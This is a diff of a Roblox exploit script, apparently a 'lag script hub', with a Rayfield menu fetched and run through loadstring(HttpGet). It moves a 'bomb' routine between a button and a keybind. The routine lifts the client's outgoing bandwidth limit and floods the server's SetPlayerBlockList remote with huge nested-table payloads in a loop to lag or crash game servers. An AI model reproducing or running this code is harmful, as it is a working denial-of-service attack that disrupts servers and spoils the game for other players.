@@ -5,8 +5,8 @@ local ConfigurationExtension = ".rfld"
 local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/Fusiom/rayfieldlib/main/source'))()
 
 local Window = Rayfield:CreateWindow({
-	Name = "FSN Hub",
-	LoadingTitle = "FSN Hub",
+	Name = "lagy script",
+	LoadingTitle = "lol",
 	LoadingSubtitle = "Fusion",
 	ConfigurationSaving = {
 		Enabled = true,
@@ -113,18 +113,17 @@ local Toggle = AutoLag:CreateToggle({
 	end,
 })
 
-local toggled2 = false
 local Keybind = AutoLag:CreateKeybind({
 	Name = "Toggle Bind",
 	CurrentKeybind = "None",
 	HoldToInteract = false,
 	Flag = "Keybind1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
 	Callback = function(Keybind)
-	    if toggled2 == false then
-	        toggled2 = true
+	    if Toggled == false then
+	        Toggled = true
 		    Toggle:Set(true)
 		else
-		    toggled2 = false
+		    Toggled = false
 		    Toggle:Set(false)
 		end
 	end,
@@ -233,73 +232,6 @@ local Button = LagTab:CreateButton({
 		Toggled = true
 		    coroutine.resume(coroutine.create(function()
 		        if debounce == true then return end
-		        local counter = 1
-		        debounce = true
-		        while true do
-                    wait(intervalValue)
-                    counter = counter + 1
-                    if counter == tonumber(loopAmount) then
-                        break
-                    end
-                    game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
-                    local function getmaxvalue(val)
-                       local mainvalueifonetable = 499999
-                       if type(val) ~= "number" then
-                           return nil
-                       end
-                       local calculateperfectval = (mainvalueifonetable/(val+2))
-                       return calculateperfectval
-                    end
-                    
-                    local function bomb(tableincrease, tries)
-                    local maintable = {}
-                    local spammedtable = {}
-                    
-                    table.insert(spammedtable, {})
-                    z = spammedtable[1]
-                    
-                    for i = 1, tableincrease do
-                        local tableins = {}
-                        table.insert(z, tableins)
-                        z = tableins
-                    end
-                    
-                    local calculatemax = getmaxvalue(tableincrease)
-                    local maximum
-                    
-                    if calculatemax then
-                         maximum = calculatemax
-                         else
-                         maximum = 999999
-                    end
-                    
-                    for i = 1, maximum do
-                         table.insert(maintable, spammedtable)
-                    end
-                    
-                    for i = 1, tries do
-                         game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
-                    end
-                    end
-                    
-                    local p1 = tonumber(impactValue)
-                    local p2 = tonumber(rateValue)
-                    bomb(p1, p2) 
-                    
-		        end
-		        debounce = false
-		    end))
-	end,
-})
-local Keybind = LagTab:CreateKeybind({
-	Name = "Toggle Auto Disable",
-	CurrentKeybind = "None",
-	HoldToInteract = false,
-	Flag = "Keybind2", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
-	Callback = function(Keybind)
-	    Toggled = true
-		    coroutine.resume(coroutine.create(function()
-		        if debounce == true then return end
 		        local counter = 0
 		        debounce = true
 		        while true do
@@ -351,6 +283,75 @@ local Keybind = LagTab:CreateKeybind({
                     
                     local p1 = tonumber(impactValue)
                     local p2 = tonumber(rateValue)
+                    print(p1, p2)
+                    bomb(p1, p2) 
+                    
+		        end
+		        debounce = false
+		    end))
+	end,
+})
+local Keybind = LagTab:CreateKeybind({
+	Name = "Toggle Auto Disable",
+	CurrentKeybind = "None",
+	HoldToInteract = false,
+	Flag = "Keybind2", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
+	Callback = function(Keybind)
+	    Toggled = true
+		    coroutine.resume(coroutine.create(function()
+		        if debounce == true then return end
+		        local counter = 1
+		        debounce = true
+		        while true do
+                    wait(intervalValue)
+                    counter = counter + 1
+                    if counter == tonumber(loopAmount) then
+                        break
+                    end
+                    game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
+                    local function getmaxvalue(val)
+                       local mainvalueifonetable = 499999
+                       if type(val) ~= "number" then
+                           return nil
+                       end
+                       local calculateperfectval = (mainvalueifonetable/(val+2))
+                       return calculateperfectval
+                    end
+                    
+                    local function bomb(tableincrease, tries)
+                    local maintable = {}
+                    local spammedtable = {}
+                    
+                    table.insert(spammedtable, {})
+                    z = spammedtable[1]
+                    
+                    for i = 1, tableincrease do
+                        local tableins = {}
+                        table.insert(z, tableins)
+                        z = tableins
+                    end
+                    
+                    local calculatemax = getmaxvalue(tableincrease)
+                    local maximum
+                    
+                    if calculatemax then
+                         maximum = calculatemax
+                         else
+                         maximum = 999999
+                    end
+                    
+                    for i = 1, maximum do
+                         table.insert(maintable, spammedtable)
+                    end
+                    
+                    for i = 1, tries do
+                         game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
+                    end
+                    end
+                    
+                    local p1 = tonumber(impactValue)
+                    local p2 = tonumber(rateValue)
+                    print(p1, p2)
                     bomb(p1, p2) 
                     
 		        end
@@ -371,7 +372,7 @@ local Slider = LagTab:CreateSlider({
 	end,
 })
 
-if not isfile(ConfigurationFolder.."/lagscripthub"..ConfigurationExtension) then 
+if not isfile(ConfigurationFolder.."/lagscripthub.rfld") then 
 	Rayfield:Notify({
     Title = "Default settings loaded!",
     Content = "Default settings were applied due to a configuration file not being found.",
@@ -391,5 +392,6 @@ else
 })
 end
 
+Toggle:Set(false) -- set lag to false on startup
 
 Rayfield:LoadConfiguration()
